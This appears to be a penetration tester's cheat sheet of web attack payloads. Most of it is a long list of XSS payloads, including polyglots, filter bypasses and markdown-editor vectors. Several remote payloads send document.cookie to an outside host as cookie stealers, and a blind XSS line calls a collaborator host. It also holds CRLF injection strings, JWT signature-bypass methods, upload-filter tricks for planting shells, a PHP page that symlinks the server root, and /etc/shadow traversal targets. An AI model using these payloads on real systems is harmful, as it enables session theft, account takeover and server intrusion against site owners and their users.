# more https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_payloads_quick.txt
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
'';!--"<XSS>=&{()}
0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
<script/src=data:,alert()>
<marquee/onstart=alert()>
<video/poster/onerror=alert()>
<isindex/autofocus/onfocus=alert()>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<a onmouseover="alert(document.cookie)">xxs link</a>
<a onmouseover=alert(document.cookie)>xxs link</a>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<IMG SRC=javascript:alert(
'XSS')>
<IMG SRC=javascript:a&
#0000108ert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav	ascript:alert('XSS');">
<IMG SRC="jav
ascript:alert('XSS');">
<IMG SRC="jav
ascript:alert('XSS');">
<IMG SRC="   javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('XSS');//
</script><script>alert('XSS');</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<IMG SRC="livescript:[code]">
<BODY ONLOAD=alert('XSS')>
<BGSOUND SRC="javascript:alert('XSS');">
<BR SIZE="&{alert('XSS')}">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
<BASE HREF="javascript:alert('XSS');//">
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://X.X.X.X/">XSS</A>
0\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"
veris-->group<svg/onload=alert(/XSS/)//
#"><img src=M onerror=alert('XSS');>
element[attribute='<img src=x onerror=alert('XSS');>
[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
%22;alert%28%27RVRSH3LL_XSS%29//
javascript:alert%281%29;
<w contenteditable id=x onfocus=alert()>
alert;pg("XSS")
<svg/onload=%26%23097lert%26lpar;1337)>
<script>for((i)in(self))eval(i)(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>
<sCR<script>iPt>alert(1)</SCr</script>IPt>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
"><img src onerror=alert(1)>
"autofocus onfocus=alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\'-alert(1)//
javascript:alert(1)
-----------

-----------Website to test/encode XSS
# http://xssor.io/
-----------

-----------Persistent XSS with JSONP
# https://www.owasp.org/images/3/35/2017-04-20-JSONPXSS.pdf
-----------

-----------Polyglot XSS
# https://github.com/0xSobky/HackVault/blob/master/XSS-polyglot.js
# https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
### 0xsobky:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("asdfasdf")//>\x3e
### Ashar Javed:
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
### Mathias Karlsson:
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
### Rsnake:
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
###  Daniel Miessler:
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
### Somdev Sangwan
<svg%0Ao%00nload=%09((pro\u006dpt))()//
### https://polyglot.innerht.ml/
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
### Polyglot blind XSS
</script><script src=//xxx.burpcollaborator.net></script>
">><marquee><img src=//xxx.burpcollaborator.net onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
-----------

-----------XSS Mindmap
# https://raw.githubusercontent.com/jackmasa/XSS.png/master/XSS2.png
-----------

-----------XSS Remote - Payloads
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_remote_payloads-http.txt
<img src=http://xerosecurity.com/.testing/xss.png>//INJECTX REMOTE
<iframe src="http://xerosecurity.com/.testing/xss_vuln.html"></iframe>//INJECTX
<script src="http://xerosecurity.com/.testing/xss.js?script_src=1"></script>//INJECTX
<img src="http://xerosecurity.com/.testing/xss.png?img_src=2"></img>//INJECTX
<iframe src="http://xerosecurity.com/.testing/iframe_injection.php?iframe_src=3" height="100%" width="100%"></iframe>//INJECTX
<img src="http://xerosecurity.com/.testing/xss.png?img_src_onerror_prompt" onerror=prompt(1) onload=prompt(2) onmouseover=prompt(3)>//INJECTX
<img src="http://xerosecurity.com/.testing/xss.png?img_src_onerror_prompt" onerror=window.location("http://135.23.158.130/.testing/xss.html");>//INJECTX
<script>location.href='http://xerosecurity.com/.testing/iframe_injection.php?'+document.cookie;</script>//INJECTX
<script src="http://xerosecurity.com/.testing/xss.js?script_src=1"></script>//INJECTX
</script><script src="http://xerosecurity.com/.testing/xss.js?script_src=1">//INJECTX
<iframe src=http://xerosecurity.com/.testing/xss_vuln.html onload=prompt(4) onmouseover=alert(5) onerror=prompt(6)><!--//*INJECTX
</textarea><iframe src=http://xerosecurity.com/.testing/xss_vuln.html onload=prompt(7) onmouseover=alert(8) onerror=prompt(9)><!--//*INJECTX
<font color=red><h1>@INJECTX<iframe src=http://xerosecurity.com/.testing/xss_vuln.html height=100% width=100% onload=prompt(10) onmouseover=alert(11) onerror=prompt(12)>
<a onclick="javascript:document.location='http://xerosecurity.com/.testing/iframe_injection.php?cookie='+document.cookie;">INJECTX COOKIE STEALER!</a>
-----------

-----------DOM XSS
#"><img src=/ onerror=alert(2)>
-----------

-----------XSS HTML5
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
-----------

-----------XSS SWF - Payloads
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xss_swf_fuzz.txt
#getURL,javascript:alert(1)",
#goto,javascript:alert(1)",	
?javascript:alert(1)",
?alert(1)",
?getURL(javascript:alert(1))",
?asfunction:getURL,javascript:alert(1)//",
?getURL,javascript:alert(1)",
?goto,javascript:alert(1)",		
?clickTAG=javascript:alert(1)",
?url=javascript:alert(1)",
?clickTAG=javascript:alert(1)&TargetAS=",
?TargetAS=javascript:alert(1)",
?skinName=asfunction:getURL,javascript:alert(1)//",
?baseurl=asfunction:getURL,javascript:alert(1)//",
?base=javascript:alert(0)",                
?onend=javascript:alert(1)//",
?userDefined=');function someFunction(a){}alert(1)//",        
?URI=javascript:alert(1)",
?callback=javascript:alert(1)",
?getURLValue=javascript:alert(1)",
?goto=javascript:alert(1)",
?pg=javascript:alert(1)",
?page=javascript:alert(1)"
?playerready=alert(document.cookie)
-----------

-----------Exploting Referer XSS
# Create the website to act as intermediate and modify the url of the Referer introducing the XSS
<html>
<body>
<form   id="xss"
        name="xss"
        method="GET"
        action="http://victim.example.com/vulnerable.php">
</form>
<script>
document.getElementById("xss").submit();
</script>
</body>
</html>
# Access to http://attacker.example.com/exploit.html?'"><script>alert(666)</script>
-----------

-----------Bypass XSS protection JS Frameworks
# http://www.securitytube.net/video/17543
-----------

-----------XSStrike - automatic tool
# https://github.com/UltimateHackers/XSStrike
-----------

-----------AngularJS XSS and sandbox escape
# https://finnwea.com/blog/stealing-passwords-from-mcdonalds-users/#void
# http://www.paulosyibelo.com/2017/07/coinbase-angularjs-dom-xss-via-kiteworks.html
-----------

-----------Same site vulnerability to XSS
# https://www.securityfocus.com/archive/1/486606/30/0/threaded
when you get localhost.example.com 127.0.0.1
-----------

-----------XSStrike tool
# https://github.com/s0md3v/XSStrike
-----------

-----------Blind XSS
# https://medium.com/bugbountywriteup/blind-xss-for-beginners-c88e48083071
# Use Burp Collaborator for example
</script><script src=//xxx.burpcollaborator.net></script>
-----------

-----------Pylyglot XSS+SQLi+SSTI
'"><svg/onload=prompt(5);>{{7*7}}==>
-----------

-----------XSS payloads for markdown editors
[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
![a](javascript:prompt(document.cookie))\
<javascript:prompt(document.cookie)>
<&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
![a'"`onerror=prompt(document.cookie)](x)\
[citelol]: (javascript:prompt(document.cookie))
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[test](javascript://%0d%0aprompt(1))
[test](javascript://%0d%0aprompt(1);com)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[clickme](vbscript:alert(document.domain))
_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
[text](http://danlec.com " [@danlec](/danlec) ")
[a](javascript:this;alert(1))
[a](javascript:this;alert(1&#41;)
[a](javascript&#58this;alert(1&#41;)
[a](Javas&#99;ript:alert(1&#41;)
[a](Javas%26%2399;ript:alert(1&#41;)
[a](javascript:alert&#65534;(1&#41;)
[a](javascript:confirm(1)
[a](javascript://www.google.com%0Aprompt(1))
[a](javascript://%0d%0aconfirm(1);com)
[a](javascript:window.onerror=confirm;throw%201)
[a](javascript:alert(document.domain&#41;)
[a](javascript://www.google.com%0Aalert(1))
[a]('javascript:alert("1")')
[a](JaVaScRiPt:alert(1))
![a](https://www.google.com/image.png"onload="alert(1))
![a]("onerror="alert(1))
</http://<?php\><\h1\><script:script>confirm(2)
-----------

-----------XSS - Increasing severity
# https://labs.mwrinfosecurity.com/blog/getting-real-with-xss/
-----------

-----------Injecting payloads in images
# https://www.kitploit.com/2019/09/pixload-image-payload-creatinginjecting.html
-----------
=================================><===


=================================>OTHER WEBSITE ATTACKS <===
-----------Same Origin Method Execution (SOME) Attack - JSONP 
# It's a way to "bypass" Same Origin Policy
# https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf
# https://www.youtube.com/watch?v=UfYfID_r7-U&spfreload=10
-- # main.html			(will create the popup)
<html>
<body>
main
<script> 
	function startSOME() { 
		mmm = window.open("step1.html");
		location.replace("https://www.octoyouknowman.com/miauuuu/createuser.php");} 
	document.body.addEventListener("click",startSOME); //Popup Blocker trick
</script>
</body>
</html>
-- # step1.html			(will trigger the callback in the popup)
<html>
popup
<script>
	function waitForDOM() {
		  location.replace("https://www.octoyouknowman.com/miauuuu/vulnerable.php?callback=opener.window.hacked");     }
	setTimeout(waitForDOM,3000);
</script>
</html>
-- # vulnerable.php		(vulnerable JSONP)
<html>
<head></head>
<?php
if (isset($_GET['callback'])) {
    $callback = $_GET['callback'];
} else {
    $callback = "logResults";
}
?> 
<body>
<script src='https://code.jquery.com/jquery-3.2.0.js' type='text/javascript'></script>
<script>
	$("body").html("Starting...");
	function logResults(json) {
		$("body").html("Normal execution");
	}
	$.ajax({
		url: "https://api.github.com/users/jeresig",
		dataType: "jsonp",
		jsonpCallback: "<?php echo $callback; ?>"
	});
</script>
</body>
</html>
-- # createuser.php		(objective of the attack)
<html>
<?php //header('Access-Control-Allow-Origin: *'); ?>
<head></head>
<body>
<script>
	function hacked(json) {
		alert("Hacked");}
</script>
</body>
</html>
-----------

-----------Reflected File Download (RFD) - JSON - JSONP - SOME Attack
# Usually with Jsonp if the response is a Content-Disposition: attachment; and we can change the filename="file.bat" for example,
# then with the callback (wich will be written in the firs tile of the file), we can include a xxxxxx||calc|| to execute the calculator (cause if the 
# previous line is FALSE then the OR executes the calc) on the system.
https://www.blackhat.com/docs/eu-14/materials/eu-14-Hafif-Reflected-File-Download-A-New-Web-Attack-Vector.pdf
https://www.davidsopas.com/reflected-file-download-cheat-sheet/
-----------

-----------File upload extension filter bypass - Shell upload
Content-Type —>Change the parameter in the request header using Burp, ZAP etc.
Put server executable extensions like file.php5, file.shtml, file.asa, file.cert
Changing letters to capital form file.aSp or file.PHp3
Using trailing spaces and/or dots at the end of the filename like file.asp… … . . .. .. , file.asp , file.asp.
Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)
Upload a file with 2 extensions—> file.php.jpg
Use of null character—> file.asp%00.jpg
Create a file with a forbidden extension —> file.asp:.jpg or file.asp::$data
Combination of the above
# Less known PHP extension
.pht
.pgif
.phtml
.shtml
-----------

-----------CRLF Injection on Location header
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20injection
http://account-global.ubnt.com/%3f%0dSet-Cookie:crlf=injection
%3f%0d	--> CR LF
Location: http://account-global.ubnt.com
Set-Cookie:crlf=injection
# https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt
%0AHeader-Test:BLATRUC
%0A%20Header-Test:BLATRUC
%20%0AHeader-Test:BLATRUC
%23%OAHeader-Test:BLATRUC
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
%3F%0AHeader-Test:BLATRUC
crlf%0AHeader-Test:BLATRUC
crlf%0A%20Header-Test:BLATRUC
crlf%20%0AHeader-Test:BLATRUC
crlf%23%OAHeader-Test:BLATRUC
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
crlf%E5%98%8A%E5%98%8D%0AHeader-Test:BLATRUC
crlf%3F%0AHeader-Test:BLATRUC
%0DHeader-Test:BLATRUC
%0D%20Header-Test:BLATRUC
%20%0DHeader-Test:BLATRUC
%23%0DHeader-Test:BLATRUC
%23%0AHeader-Test:BLATRUC
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
%3F%0DHeader-Test:BLATRUC
crlf%0DHeader-Test:BLATRUC
crlf%0D%20Header-Test:BLATRUC
crlf%20%0DHeader-Test:BLATRUC
crlf%23%0DHeader-Test:BLATRUC
crlf%23%0AHeader-Test:BLATRUC
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
crlf%E5%98%8A%E5%98%8D%0DHeader-Test:BLATRUC
crlf%3F%0DHeader-Test:BLATRUC
%0D%0AHeader-Test:BLATRUC
%0D%0A%20Header-Test:BLATRUC
%20%0D%0AHeader-Test:BLATRUC
%23%0D%0AHeader-Test:BLATRUC
\r\nHeader-Test:BLATRUC
%5cr%5cnHeader-Test:BLATRUC
%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
%3F%0D%0AHeader-Test:BLATRUC
crlf%0D%0AHeader-Test:BLATRUC
crlf%0D%0A%20Header-Test:BLATRUC
crlf%20%0D%0AHeader-Test:BLATRUC
crlf%23%0D%0AHeader-Test:BLATRUC
crlf\r\nHeader-Test:BLATRUC
crlf%5cr%5cnHeader-Test:BLATRUC
crlf%E5%98%8A%E5%98%8DHeader-Test:BLATRUC
crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:BLATRUC
crlf%3F%0D%0AHeader-Test:BLATRUC
%0D%0A%09Header-Test:BLATRUC
crlf%0D%0A%09Header-Test:BLATRUC
%250AHeader-Test:BLATRUC
%25250AHeader-Test:BLATRUC
%%0A0AHeader-Test:BLATRUC
%25%30AHeader-Test:BLATRUC
%25%30%61Header-Test:BLATRUC
%u000AHeader-Test:BLATRUC
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:BLATRUC
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:BLATRUC
/google.com/%2F..%0D%0AHeader-Test:BLATRUC
-----------

-----------Get internal IP, downgrading HTTP to 1.0
# http://blog.catalystlogic.com.au/?p=168
curl https://www.ip-assistance.pt/Test/ -v -l --http1.0 --Header "Host:"
use auxiliary/scanner/http/iis_internal_ip
-----------

-----------.net framework versions
http://blogs.msdn.com/b/rodneyviana/archive/2014/12/23/identifying-the-net-version-you-are-running-2-0-4-5-4-5-1-or-4-5-2.aspx
-----------

-----------JWT (Authentication: Bearer)
# http://www.hackplayers.com/2017/07/breaking-token-jwt-o-jwt-exposed.html
# http://www.kitploit.com/2017/08/jwt-cracker-jwt-brute-force-cracker.html
XXXXXXXXXXXXXXXXXXXX.YYYYYYYYYY.ZZZZZZZZZZZZZZZZ						--> header.payload.signature
Online Debugger: https://jwt.io/
Another online debugger: http://kjur.github.io/jsjws/tool_jwt.html
Bruteforce script: ./scripts/jwt.py
Bruteforce HS256: https://www.npmjs.com/package/jwt-cracker
Vulnerabilities: https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/
# None attack (assign none algorithm, remove signature but leave the last dot)
XXXXXXXXXXXXXXXXXXXX.YYYYYYYYYY.
# HS256 Attacks:
Bruteforce the secret (hashcat supports JWT format)
# RS256 Attacks:			--> https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/
If you have the public key, change the algorithm to HS256 and submit the public key as the secret.
There are some frameworks that will make the mistake to verify the secret with the public key of the RS256.
Obviusly not with OAuth as the public key is not in client.
-----------

-----------PHP view files withou permissions (symbolic links) (.php)
<html>
<head>
<title>Bypass Root Path</title>
</head>
<br><br><body bgColor="F87217"><tr><td>
<?php
echo "<form method='POST' action=''>" ;
echo "<center><input type='submit' value='Bypass it' name='Symbolic1'></center>";
if (isset($_POST['Symbolic1'])){ system('ln -s / Symbolic1.link');
$fvckem ='XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX';
$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Symbolic2 = symlink("/","Symbolic2.link");
$rt="<br><a href=Symbolic2.link TARGET='_blank'><font color=#000000 size=2 face='Courier New'><b>Click here to access</b></font></a>";
echo "<br><br><b>Done:</b><br>$rt</center>";}
echo "</form>"; ?>
</td></tr>
</body>
</html>
-----------

-----------Path Traversal
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/traversal-short.txt
# https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/traversal.txt
/etc/passwd
/etc/passwd%00
/etc/shadow
